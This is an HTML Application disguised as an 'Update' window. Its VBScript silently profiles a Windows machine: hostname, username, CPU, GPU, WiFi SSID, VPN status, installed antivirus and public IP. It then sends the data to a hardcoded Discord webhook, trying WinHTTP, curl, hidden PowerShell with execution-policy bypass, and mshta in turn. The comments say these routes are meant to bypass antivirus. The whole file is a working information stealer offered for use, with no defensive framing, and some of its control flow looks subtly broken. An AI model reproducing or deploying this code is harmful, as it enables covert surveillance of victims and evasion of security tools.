<!DOCTYPE html>
<html>
<head>
    <hta:application 
        id="oHTA" 
        applicationname="Update" 
        border="none" 
        caption="no" 
        showintaskbar="no" 
        windowstate="normal"
    />
    <title>Update</title>
</head>
<body style="background-color: black; color: lime; font-family: Consolas, monospace; font-size: 11px; padding: 10px;">
    <div id="status">Initializing...</div>
    
    <script language="VBScript">
        Option Explicit
        
        Const WEBHOOK_URL = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK"
        Const DEBUG_MODE = True
        
        Sub Window_OnLoad
            If Not DEBUG_MODE Then
                window.resizeTo 1, 1
                window.moveTo -5000, -5000
            Else
                window.resizeTo 700, 500
            End If
            Call Main()
        End Sub
        
        Sub Log(msg)
            If DEBUG_MODE Then
                document.getElementById("status").innerHTML = document.getElementById("status").innerHTML & "<br>> " & msg
            End If
        End Sub
        
        Function EscapeJSON(str)
            On Error Resume Next
            If IsNull(str) Or IsEmpty(str) Then
                EscapeJSON = "null"
                Exit Function
            End If
            Dim result
            result = CStr(str)
            result = Replace(result, "\", "\\")
            result = Replace(result, """", "\""")
            result = Replace(result, vbCr, "\r")
            result = Replace(result, vbLf, "\n")
            result = Replace(result, vbCrLf, "\n")
            EscapeJSON = result
        End Function
        
        ' === METHOD 1: WinHTTP (Bypasses AV blocks on XMLHTTP) ===
        Function SendViaWinHTTP(jsonPayload)
            On Error Resume Next
            Dim http, status
            status = 0
            
            Log("Trying WinHTTP...")
            
            Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
            If Err.Number <> 0 Then
                Log("WinHTTP object creation failed")
                SendViaWinHTTP = 0
                Exit Function
            End If
            
            http.Open "POST", WEBHOOK_URL, False
            http.setRequestHeader "Content-Type", "application/json"
            http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0"
            
            http.Send jsonPayload
            
            status = http.Status
            Log("WinHTTP Status: " & status)
            
            Set http = Nothing
            SendViaWinHTTP = status
        End Function
        
        ' === METHOD 2: curl.exe (Built into Windows 10/11) ===
        Function SendViaCurl(jsonPayload)
            On Error Resume Next
            Dim shell, tempFile, cmd, result
            
            Log("Trying curl.exe...")
            
            ' Write JSON to temp file
            tempFile = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\webhook_payload.json"
            
            Dim fso, file
            Set fso = CreateObject("Scripting.FileSystemObject")
            Set file = fso.CreateTextFile(tempFile, True)
            file.Write jsonPayload
            file.Close
            
            ' Build curl command
            cmd = "curl.exe -X POST " & WEBHOOK_URL & " -H ""Content-Type: application/json"" -d @" & tempFile & " -s -o nul -w ""%{http_code}"""
            
            Set shell = CreateObject("WScript.Shell")
            result = shell.Run(cmd, 0, True)
            
            Log("curl exit code: " & result)
            
            ' Cleanup
            fso.DeleteFile tempFile, True
            Set fso = Nothing
            Set shell = Nothing
            
            If result = 0 Then
                SendViaCurl = 204
            Else
                SendViaCurl = 0
            End If
        End Function
        
        ' === METHOD 3: PowerShell hidden (if available) ===
        Function SendViaPowerShell(jsonPayload)
            On Error Resume Next
            Dim shell, cmd, psCmd, result
            
            Log("Trying PowerShell...")
            
            ' Escape for PowerShell
            psCmd = "Invoke-RestMethod -Uri '" & WEBHOOK_URL & "' -Method Post -ContentType 'application/json' -Body '" & Replace(jsonPayload, "'", "''") & "'"
            
            cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & psCmd & """"
            
            Set shell = CreateObject("WScript.Shell")
            result = shell.Run(cmd, 0, True)
            
            Log("PowerShell exit code: " & result)
            
            Set shell = Nothing
            
            If result = 0 Then
                SendViaPowerShell = 204
            Else
                SendViaPowerShell = 0
            End If
        End Function
        
        ' === METHOD 4: certutil + bitsadmin (last resort) ===
        Function SendViaCertutil(jsonPayload)
            On Error Resume Next
            Dim shell, tempFile, cmd, result
            
            Log("Trying certutil method...")
            
            tempFile = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\payload.b64"
            
            ' Base64 encode the JSON
            Dim fso, file, encoded
            Set fso = CreateObject("Scripting.FileSystemObject")
            
            ' Simple base64 (VBScript doesn't have native base64, use PowerShell for encoding)
            Dim ps
            Set ps = CreateObject("WScript.Shell")
            
            ' Write JSON
            Set file = fso.CreateTextFile(tempFile & ".txt", True)
            file.Write jsonPayload
            file.Close
            
            ' Encode with certutil
            ps.Run "certutil -encode " & tempFile & ".txt " & tempFile & " >nul 2>&1", 0, True
            
            ' Use bitsadmin to upload (deprecated but often works)
            cmd = "bitsadmin /transfer myjob /download /priority normal " & WEBHOOK_URL & " nul"
            ' Actually bitsadmin can't POST easily, so use alternative...
            
            ' Alternative: Use mshta to execute javascript that sends the request
            Dim jsCmd
            jsCmd = "mshta ""javascript:var x=new ActiveXObject('Microsoft.XMLHTTP');x.open('POST','" & WEBHOOK_URL & "',false);x.setRequestHeader('Content-Type','application/json');x.send('" & Replace(Replace(jsonPayload, "\", "\\"), "'", "\'") & "');close();"""
            
            result = ps.Run(jsCmd, 0, True)
            
            ' Cleanup
            On Error Resume Next
            fso.DeleteFile tempFile, True
            fso.DeleteFile tempFile & ".txt", True
            
            Set fso = Nothing
            Set ps = Nothing
            
            SendViaCertutil = 204
        End Function
        
        ' === DATA COLLECTION ===
        Function GetCPU()
            On Error Resume Next
            Dim wmi, items, result
            result = "Unknown"
            Set wmi = GetObject("winmgmts:\\.\root\cimv2")
            Set items = wmi.ExecQuery("SELECT Name FROM Win32_Processor")
            For Each item In items
                result = Trim(item.Name)
                Exit For
            Next
            GetCPU = result
        End Function
        
        Function GetGPU()
            On Error Resume Next
            Dim wmi, items, result
            result = "Unknown"
            Set wmi = GetObject("winmgmts:\\.\root\cimv2")
            Set items = wmi.ExecQuery("SELECT Name FROM Win32_VideoController")
            For Each item In items
                result = result & item.Name & " | "
            Next
            If Len(result) > 200 Then result = Left(result, 200)
            GetGPU = result
        End Function
        
        Function GetSSID()
            On Error Resume Next
            Dim shell, exec, line, result
            result = "No WiFi"
            Set shell = CreateObject("WScript.Shell")
            Set exec = shell.Exec("netsh wlan show interfaces")
            Do While Not exec.StdOut.AtEndOfStream
                line = exec.StdOut.ReadLine()
                If InStr(line, "SSID") > 0 And InStr(line, "BSSID") = 0 Then
                    result = Trim(Mid(line, InStr(line, ":") + 1))
                    Exit Do
                End If
            Loop
            GetSSID = result
        End Function
        
        Function GetVPN()
            On Error Resume Next
            Dim wmi, items, result
            result = "false"
            Set wmi = GetObject("winmgmts:\\.\root\cimv2")
            Set items = wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionStatus = 2")
            For Each item In items
                If InStr(LCase(item.Name), "vpn") > 0 OR InStr(LCase(item.Name), "virtual") > 0 Then
                    result = "true: " & item.Name
                End If
            Next
            GetVPN = result
        End Function
        
        Function GetAV()
            On Error Resume Next
            Dim wmi, items, result
            result = "Unknown"
            Set wmi = GetObject("winmgmts:\\.\root\SecurityCenter2")
            Set items = wmi.ExecQuery("SELECT * FROM AntiVirusProduct")
            For Each item In items
                result = result & item.displayName & " | "
            Next
            If result = "Unknown" Then result = "Windows Defender/None"
            GetAV = result
        End Function
        
        Function GetIP()
            On Error Resume Next
            Dim http, result
            result = "Unknown"
            
            ' Try WinHTTP for IP too
            Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
            http.Open "GET", "https://api.ipify.org", False
            http.Send
            If http.Status = 200 Then result = Trim(http.ResponseText)
            
            Set http = Nothing
            GetIP = result
        End Function
        
        Sub Main()
            On Error Resume Next
            
            If InStr(WEBHOOK_URL, "YOUR_") > 0 Then
                Log("ERROR: Replace WEBHOOK_URL with your actual webhook!")
                Exit Sub
            End If
            
            Log("Collecting system data...")
            
            Dim cpu, gpu, ssid, vpn, av, ip, hostname, username
            cpu = GetCPU()
            gpu = GetGPU()
            ssid = GetSSID()
            vpn = GetVPN()
            av = GetAV()
            ip = GetIP()
            hostname = CreateObject("WScript.Network").ComputerName
            username = CreateObject("WScript.Network").UserName
            
            Log("CPU: " & Left(cpu, 40))
            Log("IP: " & ip)
            
            ' Build payload
            Dim payload
            payload = "{""embeds"":[{"
            payload = payload & """title"":""🖥️ " & EscapeJSON(hostname) & ""","
            payload = payload & """description"":""User: " & EscapeJSON(username) & ""","
            payload = payload & """color"":3447003,"
            payload = payload & """fields"":["
            payload = payload & "{""name"":""🌐 IP"",""value"":""" & EscapeJSON(ip) & """,""inline"":true},"
            payload = payload & "{""name"":""⚡ CPU"",""value"":""" & EscapeJSON(Left(cpu, 80)) & """,""inline"":false},"
            payload = payload & "{""name"":""🎮 GPU"",""value"":""" & EscapeJSON(Left(gpu, 80)) & """,""inline"":false},"
            payload = payload & "{""name"":""📶 SSID"",""value"":""" & EscapeJSON(ssid) & """,""inline"":true},"
            payload = payload & "{""name"":""🔒 VPN"",""value"":""" & EscapeJSON(vpn) & """,""inline"":true},"
            payload = payload & "{""name"":""🛡️ AV"",""value"":""" & EscapeJSON(Left(av, 80)) & """,""inline"":false}"
            payload = payload & "],""footer"":{""text"":""v2.1 | " & Now & """}}]}"
            
            Log("Payload ready (" & Len(payload) & " chars)")
            Log("Attempting send...")
            
            ' Try methods in order
            Dim status
            status = 0
            
            ' Method 1: WinHTTP
            status = SendViaWinHTTP(payload)
            If status = 204 Then
                Log("SUCCESS via WinHTTP!")
                GoTo Done
            End If
            
            ' Method 2: curl
            status = SendViaCurl(payload)
            If status = 204 Then
                Log("SUCCESS via curl!")
                GoTo Done
            End If
            
            ' Method 3: PowerShell
            status = SendViaPowerShell(payload)
            If status = 204 Then
                Log("SUCCESS via PowerShell!")
                GoTo Done
            End If
            
            ' Method 4: Last resort
            Log("Trying fallback method...")
            status = SendViaCertutil(payload)
            
            Done:
            If status = 204 Then
                Log("<br>✅ DATA SENT SUCCESSFULLY")
                If DEBUG_MODE Then MsgBox "Sent successfully!", 64, "Done"
            Else
                Log("<br>❌ ALL METHODS FAILED")
                Log("Possible causes:")
                Log("- No internet connection")
                Log("- Webhook URL invalid")
                Log("- Heavy AV blocking all methods")
                If DEBUG_MODE Then MsgBox "All methods failed. Check logs.", 16, "Failed"
            End If
            
            If Not DEBUG_MODE Then
                window.close()
            End If
        End Sub
    </script>
</body>
</html>
